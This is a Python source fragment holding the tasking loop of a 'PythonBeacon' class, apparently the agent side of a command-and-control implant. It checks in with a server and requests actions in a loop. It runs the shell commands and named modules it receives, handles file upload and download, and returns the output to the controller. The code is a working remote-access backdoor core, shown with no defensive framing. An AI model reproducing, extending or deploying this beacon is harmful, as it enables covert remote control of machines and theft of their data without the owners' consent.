    # Check-in methods - Added to PythonBeacon class

    def request_action(self):
        """Request pending action from server"""
        message = f"request_action|{self.agent_id}"
        self.log(f"Requesting action: {message}")
        response = self.send_message(message)
        self.log(f"Action response: {response}")
        return response

    def send_checkin(self):
        """Send checkin heartbeat"""
        message = f"checkin|{self.agent_id}"
        response = self.send_message(message, expect_response=False)
        return response

    def send_command_output(self, output):
        """Send command output to server"""
        message = f"command_output|{self.agent_id}|{output}"
        response = self.send_message(message, expect_response=False)
        return response

    def process_command(self, command_data):
        """Process command from server"""
        try:
            # Check for standard "no command" responses from server
            no_command_responses = [
                "",
                "No commands queued",
                "no_pending_commands",
                "No pending commands"
            ]

            if not command_data or command_data in no_command_responses:
                return None

            self.log(f"Processing: {command_data}")

            # Parse command format: command_type|parameters
            if "|" in command_data:
                parts = command_data.split("|", 1)
                command_type = parts[0]
                parameters = parts[1] if len(parts) > 1 else ""

                # Dispatch to appropriate handler
                if command_type == "execute_command":
                    if hasattr(self, 'execute_command'):
                        output = self.execute_command(parameters)
                        self.send_command_output(output)
                elif command_type == "execute_module":
                    # Format: execute_module|module_name|parameters
                    module_parts = parameters.split("|", 1)
                    module_name = module_parts[0]
                    module_params = module_parts[1] if len(module_parts) > 1 else ""
                    self._execute_module(module_name, module_params)
                elif command_type == "download_file":
                    if hasattr(self, 'download_file'):
                        output = self.download_file(parameters)
                        self.send_command_output(output)
                elif command_type == "upload_file":
                    if hasattr(self, 'upload_file'):
                        output = self.upload_file(parameters)
                        self.send_command_output(output)
                else:
                    self.log(f"Unknown command type: {command_type}")
            else:
                # Simple command execution (backwards compatibility)
                if hasattr(self, 'execute_command'):
                    output = self.execute_command(command_data)
                    self.send_command_output(output)

        except Exception as e:
            self.log(f"Error processing command: {e}")
            self.send_command_output(f"ERROR: {e}")

    def _execute_module(self, module_name, parameters):
        """Execute a module by name - dispatcher for dynamic modules"""
        try:
            # Look for method matching module name
            method_name = module_name.replace("-", "_").lower()
            if hasattr(self, method_name):
                method = getattr(self, method_name)
                if parameters:
                    output = method(parameters)
                else:
                    output = method()
                self.send_command_output(output)
            else:
                self.log(f"Module not found: {module_name}")
                self.send_command_output(f"ERROR: Module '{module_name}' not available")
        except Exception as e:
            self.log(f"Error executing module {module_name}: {e}")
            self.send_command_output(f"ERROR: {e}")

    def run(self):
        """Main beacon loop"""
        self.log("Starting beacon...")

        # Initial registration
        self.register()
        self.is_running = True

        try:
            while self.is_running:
                try:
                    # Request action from server
                    self.log("Starting beacon cycle...")
                    action = self.request_action()

                    if action and not action.startswith("ERROR"):
                        self.process_command(action)
                    elif action and action.startswith("ERROR"):
                        self.log(f"Communication error: {action}")
                        self.log("Will retry in next cycle...")

                    # Wait before next cycle
                    self.log(f"Waiting {self.check_in_interval} seconds before next cycle...")
                    time.sleep(self.check_in_interval)

                except KeyboardInterrupt:
                    self.log("Beacon interrupted by user")
                    break
                except Exception as e:
                    self.log(f"Beacon error: {e}")
                    time.sleep(5)  # Wait before retry

        except Exception as e:
            self.log(f"Fatal beacon error: {e}")
        finally:
            self.is_running = False
            self.log("Beacon stopped")
